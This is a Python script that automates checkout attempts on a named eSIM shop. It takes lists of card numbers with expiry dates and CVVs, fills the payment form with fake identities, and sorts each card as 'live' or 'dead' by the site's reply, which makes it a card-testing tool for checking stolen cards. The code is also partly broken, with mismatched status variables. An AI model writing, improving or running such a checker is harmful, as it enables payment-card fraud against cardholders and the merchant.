from ast import Str
import requests
import random
import string
import secrets
from faker import Faker
import asyncio
from playwright.async_api import async_playwright
fake = Faker()
from bs4 import BeautifulSoup

# Generar una contraseña aleatoria
def generate_password(pwd_length=10):
    alphabet = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(alphabet) for _ in range(pwd_length))



# Función principal que ejecuta la automatización con Playwright
async def process_card(card):
    cc, mes, ano_number, cvv = card.split('|')
    if len(ano_number) == 2:
        ano_number = "20" + ano_number

    async with async_playwright() as p:
        # Usar 'p' en lugar de 'playwright'
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox"]
        )
        context = await browser.new_context()
        page = await context.new_page()
        try:
            # Generación de datos
            apellido = fake.last_name()
            nombre = "andres" + str(apellido)
            co = '958' + str(random.randint(0, 9999)) + '@gmail.com'
            num = random.randint(0, 999)
            correo = f"{num}{apellido}{num}{co}"
            em = f"{nombre}{apellido}{str(random.randint(0, 9999))}@gmail.com"
            cn = f"{apellido} {nombre}"

            # Rellenar formulario
            await page.goto("https://chuliphone.com/compra-esim")
            await page.wait_for_timeout(1000)
            await page.locator(".card-sim__btn").first.click()
            await page.wait_for_timeout(1000)
            await page.get_by_role("textbox", name="Juan Antonio").click()
            await page.get_by_role("textbox", name="Juan Antonio").type(nombre,delay=100)
            await page.wait_for_timeout(1000)
            await page.get_by_role("textbox", name="Peréz López").click()
            await page.get_by_role("textbox", name="Peréz López").type(apellido,delay=100)
            await page.wait_for_timeout(1000)
            await page.get_by_role("textbox", name="5678 9123 4567").click()
            await page.get_by_role("textbox", name="5678 9123 4567").type(cc,delay=100)
            await page.wait_for_timeout(1000)
            await page.get_by_role("textbox", name="/21").click()
            await page.get_by_role("textbox", name="/21").type(f"{mes}/{ano_number[-2:]}",delay=100)
            await page.wait_for_timeout(1000)
            await page.get_by_role("textbox", name="123", exact=True).click()
            await page.get_by_role("textbox", name="123", exact=True).type(cvv,delay=100)
            await page.wait_for_timeout(1000)
            await page.get_by_role("textbox", name="34180").click()
            await page.get_by_role("textbox", name="34180").type("97900",delay=100)
            await page.wait_for_timeout(1000)
            await page.get_by_role("button", name="Pagar").click()
            await page.wait_for_timeout(7000)
            try:
                await page.wait_for_selector("#swal2-content", timeout=10000)
                texto = await page.inner_text("#swal2-content")
                if "Tu pago no ha podido ser procesado" in texto:
                    status = "dead"
                    mensaje="Tu pago no ha podido ser procesado"
                else:
                    status = "live"
                    mensaje = f"Aprobado | Monto: 100"

            except Exception:
                estatus = "live"
            print("Estatus:", estatus)


            await page.wait_for_timeout(3000)
            return {"status": status, "message": mensaje, "cc": card}
           


           

            

            

                

             # Enviar resultado al chat de Telegram
           

        except Exception as e:
            respuesta = f"{cc}|{mes}|{ano_number}|{cvv}\n | Error: {e}"
            print(f"Error: {respuesta}")
            await browser.close()

            return respuesta
